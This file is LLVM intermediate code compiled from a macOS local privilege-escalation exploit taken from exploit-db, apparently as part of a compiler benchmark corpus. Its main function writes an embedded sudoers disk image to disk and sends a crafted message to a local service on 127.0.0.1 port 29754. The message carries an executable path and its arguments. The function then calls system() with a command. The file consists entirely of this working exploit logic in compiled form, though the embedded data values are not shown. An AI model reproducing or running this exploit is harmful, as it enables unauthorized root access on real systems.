; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/osx/local/extr_38303.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/osx/local/extr_38303.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sockaddr_in = type { i32, %struct.TYPE_2__, i32 }
%struct.TYPE_2__ = type { i32 }
%struct.sockaddr = type { i32 }

@EXEC_PATH = common dso_local global i8* null, align 8
@EXEC_ARGS = common dso_local global i8* null, align 8
@DMG_PATH = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [6 x i8] c"creat\00", align 1
@_private_tmp_sudoers_dmg = common dso_local global i8* null, align 8
@_private_tmp_sudoers_dmg_len = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [6 x i8] c"write\00", align 1
@.str.2 = private unnamed_addr constant [7 x i8] c"malloc\00", align 1
@AF_INET = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [10 x i8] c"127.0.0.1\00", align 1
@.str.4 = private unnamed_addr constant [8 x i8] c"connect\00", align 1
@CMD_TO_EXEC = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1, i8** %2) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8**, align 8
  %7 = alloca i8**, align 8
  %8 = alloca i8*, align 8
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca %struct.sockaddr_in, align 4
  %13 = alloca i8*, align 8
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8*, align 8
  store i32 0, i32* %4, align 4
  store i32 %0, i32* %5, align 4
  store i8** %1, i8*** %6, align 8
  store i8** %2, i8*** %7, align 8
  %17 = load i8*, i8** @EXEC_PATH, align 8
  store i8* %17, i8** %8, align 8
  %18 = load i8*, i8** @EXEC_ARGS, align 8
  store i8* %18, i8** %9, align 8
  store i32 0, i32* %15, align 4
  %19 = load i32, i32* @DMG_PATH, align 4
  %20 = call i32 @creat(i32 %19, i32 420)
  store i32 %20, i32* %10, align 4
  %21 = icmp eq i32 %20, -1
  br i1 %21, label %22, label %24

22:                                               ; preds = %3
  %23 = call i32 @perror(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str, i64 0, i64 0))
  store i32 1, i32* %4, align 4
  br label %214

24:                                               ; preds = %3
  %25 = load i32, i32* %10, align 4
  %26 = load i8*, i8** @_private_tmp_sudoers_dmg, align 8
  %27 = load i32, i32* @_private_tmp_sudoers_dmg_len, align 4
  %28 = call i32 @write(i32 %25, i8* %26, i32 %27)
  %29 = load i32, i32* @_private_tmp_sudoers_dmg_len, align 4
  %30 = icmp ne i32 %28, %29
  br i1 %30, label %31, label %37

31:                                               ; preds = %24
  %32 = call i32 @perror(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.1, i64 0, i64 0))
  %33 = load i32, i32* %10, align 4
  %34 = call i32 @close(i32 %33)
  %35 = load i32, i32* @DMG_PATH, align 4
  %36 = call i32 @unlink(i32 %35)
  store i32 2, i32* %4, align 4
  br label %214

37:                                               ; preds = %24
  %38 = load i32, i32* %10, align 4
  %39 = call i32 @close(i32 %38)
  %40 = load i8*, i8** %8, align 8
  %41 = call i32 @strlen(i8* %40)
  %42 = add nsw i32 10, %41
  %43 = load i8*, i8** %9, align 8
  %44 = call i32 @strlen(i8* %43)
  %45 = add nsw i32 %42, %44
  store i32 %45, i32* %14, align 4
  %46 = load i32, i32* %14, align 4
  %47 = add i32 %46, 26
  %48 = call i64 @malloc(i32 %47)
  %49 = inttoptr i64 %48 to i8*
  store i8* %49, i8** %13, align 8
  %50 = icmp eq i8* %49, null
  br i1 %50, label %51, label %55

51:                                               ; preds = %37
  %52 = call i32 @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.2, i64 0, i64 0))
  %53 = load i32, i32* @DMG_PATH, align 4
  %54 = call i32 @unlink(i32 %53)
  store i32 3, i32* %4, align 4
  br label %214

55:                                               ; preds = %37
  %56 = load i8*, i8** %13, align 8
  %57 = getelementptr inbounds i8, i8* %56, i64 0
  store i8 79, i8* %57, align 1
  %58 = load i8*, i8** %13, align 8
  %59 = getelementptr inbounds i8, i8* %58, i64 1
  store i8 67, i8* %59, align 1
  %60 = load i8*, i8** %13, align 8
  %61 = getelementptr inbounds i8, i8* %60, i64 2
  store i8 83, i8* %61, align 1
  %62 = load i8*, i8** %13, align 8
  %63 = getelementptr inbounds i8, i8* %62, i64 3
  store i8 67, i8* %63, align 1
  %64 = load i8*, i8** %13, align 8
  %65 = getelementptr inbounds i8, i8* %64, i64 4
  store i8 26, i8* %65, align 1
  %66 = load i8*, i8** %13, align 8
  %67 = getelementptr inbounds i8, i8* %66, i64 5
  store i8 0, i8* %67, align 1
  %68 = load i32, i32* %14, align 4
  %69 = and i32 %68, 255
  %70 = trunc i32 %69 to i8
  %71 = load i8*, i8** %13, align 8
  %72 = getelementptr inbounds i8, i8* %71, i64 6
  store i8 %70, i8* %72, align 1
  %73 = load i32, i32* %14, align 4
  %74 = lshr i32 %73, 8
  %75 = and i32 %74, 255
  %76 = trunc i32 %75 to i8
  %77 = load i8*, i8** %13, align 8
  %78 = getelementptr inbounds i8, i8* %77, i64 7
  store i8 %76, i8* %78, align 1
  %79 = load i8*, i8** %16, align 8
  %80 = call i32 @uuid_generate(i8* %79)
  %81 = load i8*, i8** %13, align 8
  %82 = getelementptr inbounds i8, i8* %81, i64 8
  %83 = load i8*, i8** %16, align 8
  %84 = call i32 @memcpy(i8* %82, i8* %83, i32 16)
  store i32 24, i32* %15, align 4
  %85 = load i8*, i8** %13, align 8
  %86 = load i32, i32* %15, align 4
  %87 = zext i32 %86 to i64
  %88 = getelementptr inbounds i8, i8* %85, i64 %87
  store i8 1, i8* %88, align 1
  %89 = load i8*, i8** %13, align 8
  %90 = load i32, i32* %15, align 4
  %91 = add i32 %90, 1
  %92 = zext i32 %91 to i64
  %93 = getelementptr inbounds i8, i8* %89, i64 %92
  store i8 2, i8* %93, align 1
  %94 = load i8*, i8** %13, align 8
  %95 = load i32, i32* %15, align 4
  %96 = add i32 %95, 2
  %97 = zext i32 %96 to i64
  %98 = getelementptr inbounds i8, i8* %94, i64 %97
  store i8 0, i8* %98, align 1
  %99 = load i8*, i8** %13, align 8
  %100 = load i32, i32* %15, align 4
  %101 = add i32 %100, 3
  %102 = zext i32 %101 to i64
  %103 = getelementptr inbounds i8, i8* %99, i64 %102
  store i8 1, i8* %103, align 1
  %104 = load i8*, i8** %13, align 8
  %105 = load i32, i32* %15, align 4
  %106 = add i32 %105, 4
  %107 = zext i32 %106 to i64
  %108 = getelementptr inbounds i8, i8* %104, i64 %107
  store i8 0, i8* %108, align 1
  %109 = load i8*, i8** %8, align 8
  %110 = call i32 @strlen(i8* %109)
  %111 = and i32 %110, 255
  %112 = add nsw i32 %111, 1
  %113 = trunc i32 %112 to i8
  %114 = load i8*, i8** %13, align 8
  %115 = load i32, i32* %15, align 4
  %116 = add i32 %115, 5
  %117 = zext i32 %116 to i64
  %118 = getelementptr inbounds i8, i8* %114, i64 %117
  store i8 %113, i8* %118, align 1
  %119 = load i32, i32* %15, align 4
  %120 = add i32 %119, 6
  store i32 %120, i32* %15, align 4
  %121 = load i8*, i8** %13, align 8
  %122 = load i32, i32* %15, align 4
  %123 = zext i32 %122 to i64
  %124 = getelementptr inbounds i8, i8* %121, i64 %123
  %125 = load i8*, i8** %8, align 8
  %126 = load i8*, i8** %8, align 8
  %127 = call i32 @strlen(i8* %126)
  %128 = add nsw i32 %127, 1
  %129 = call i32 @memcpy(i8* %124, i8* %125, i32 %128)
  %130 = load i8*, i8** %8, align 8
  %131 = call i32 @strlen(i8* %130)
  %132 = add nsw i32 %131, 1
  %133 = load i32, i32* %15, align 4
  %134 = add i32 %133, %132
  store i32 %134, i32* %15, align 4
  %135 = load i8*, i8** %13, align 8
  %136 = load i32, i32* %15, align 4
  %137 = zext i32 %136 to i64
  %138 = getelementptr inbounds i8, i8* %135, i64 %137
  store i8 0, i8* %138, align 1
  %139 = load i8*, i8** %13, align 8
  %140 = load i32, i32* %15, align 4
  %141 = add i32 %140, 1
  %142 = zext i32 %141 to i64
  %143 = getelementptr inbounds i8, i8* %139, i64 %142
  store i8 2, i8* %143, align 1
  %144 = load i8*, i8** %13, align 8
  %145 = load i32, i32* %15, align 4
  %146 = add i32 %145, 2
  %147 = zext i32 %146 to i64
  %148 = getelementptr inbounds i8, i8* %144, i64 %147
  store i8 0, i8* %148, align 1
  %149 = load i8*, i8** %9, align 8
  %150 = call i32 @strlen(i8* %149)
  %151 = and i32 %150, 255
  %152 = add nsw i32 %151, 1
  %153 = trunc i32 %152 to i8
  %154 = load i8*, i8** %13, align 8
  %155 = load i32, i32* %15, align 4
  %156 = add i32 %155, 3
  %157 = zext i32 %156 to i64
  %158 = getelementptr inbounds i8, i8* %154, i64 %157
  store i8 %153, i8* %158, align 1
  %159 = load i32, i32* %15, align 4
  %160 = add i32 %159, 4
  store i32 %160, i32* %15, align 4
  %161 = load i8*, i8** %13, align 8
  %162 = load i32, i32* %15, align 4
  %163 = zext i32 %162 to i64
  %164 = getelementptr inbounds i8, i8* %161, i64 %163
  %165 = load i8*, i8** %9, align 8
  %166 = load i8*, i8** %9, align 8
  %167 = call i32 @strlen(i8* %166)
  %168 = add nsw i32 %167, 1
  %169 = call i32 @memcpy(i8* %164, i8* %165, i32 %168)
  %170 = load i32, i32* @AF_INET, align 4
  %171 = load i32, i32* @SOCK_STREAM, align 4
  %172 = call i32 @socket(i32 %170, i32 %171, i32 0)
  store i32 %172, i32* %11, align 4
  %173 = call i32 @bzero(%struct.sockaddr_in* %12, i32 12)
  %174 = load i32, i32* @AF_INET, align 4
  %175 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %12, i32 0, i32 2
  store i32 %174, i32* %175, align 4
  %176 = call i32 @inet_addr(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.3, i64 0, i64 0))
  %177 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %12, i32 0, i32 1
  %178 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %177, i32 0, i32 0
  store i32 %176, i32* %178, align 4
  %179 = call i32 @htons(i32 29754)
  %180 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %12, i32 0, i32 0
  store i32 %179, i32* %180, align 4
  %181 = load i32, i32* %11, align 4
  %182 = bitcast %struct.sockaddr_in* %12 to %struct.sockaddr*
  %183 = call i32 @connect(i32 %181, %struct.sockaddr* %182, i32 12)
  %184 = icmp eq i32 %183, -1
  br i1 %184, label %185, label %191

185:                                              ; preds = %55
  %186 = call i32 @perror(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.4, i64 0, i64 0))
  %187 = load i32, i32* @DMG_PATH, align 4
  %188 = call i32 @unlink(i32 %187)
  %189 = load i8*, i8** %13, align 8
  %190 = call i32 @free(i8* %189)
  store i32 4, i32* %4, align 4
  br label %214

191:                                              ; preds = %55
  %192 = load i32, i32* %11, align 4
  %193 = load i8*, i8** %13, align 8
  %194 = load i32, i32* %14, align 4
  %195 = add i32 %194, 26
  %196 = call i32 @write(i32 %192, i8* %193, i32 %195)
  %197 = icmp eq i32 %196, -1
  br i1 %197, label %198, label %204

198:                                              ; preds = %191
  %199 = call i32 @perror(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.1, i64 0, i64 0))
  %200 = load i32, i32* @DMG_PATH, align 4
  %201 = call i32 @unlink(i32 %200)
  %202 = load i8*, i8** %13, align 8
  %203 = call i32 @free(i8* %202)
  store i32 5, i32* %4, align 4
  br label %214

204:                                              ; preds = %191
  %205 = load i32, i32* %11, align 4
  %206 = call i32 @close(i32 %205)
  %207 = call i32 @sleep(i32 5)
  %208 = load i32, i32* @CMD_TO_EXEC, align 4
  %209 = call i32 @system(i32 %208)
  %210 = load i32, i32* @DMG_PATH, align 4
  %211 = call i32 @unlink(i32 %210)
  %212 = load i8*, i8** %13, align 8
  %213 = call i32 @free(i8* %212)
  store i32 0, i32* %4, align 4
  br label %214

214:                                              ; preds = %204, %198, %185, %51, %31, %22
  %215 = load i32, i32* %4, align 4
  ret i32 %215
}

declare dso_local i32 @creat(i32, i32) #1

declare dso_local i32 @perror(i8*) #1

declare dso_local i32 @write(i32, i8*, i32) #1

declare dso_local i32 @close(i32) #1

declare dso_local i32 @unlink(i32) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i64 @malloc(i32) #1

declare dso_local i32 @uuid_generate(i8*) #1

declare dso_local i32 @memcpy(i8*, i8*, i32) #1

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @bzero(%struct.sockaddr_in*, i32) #1

declare dso_local i32 @inet_addr(i8*) #1

declare dso_local i32 @htons(i32) #1

declare dso_local i32 @connect(i32, %struct.sockaddr*, i32) #1

declare dso_local i32 @free(i8*) #1

declare dso_local i32 @sleep(i32) #1

declare dso_local i32 @system(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
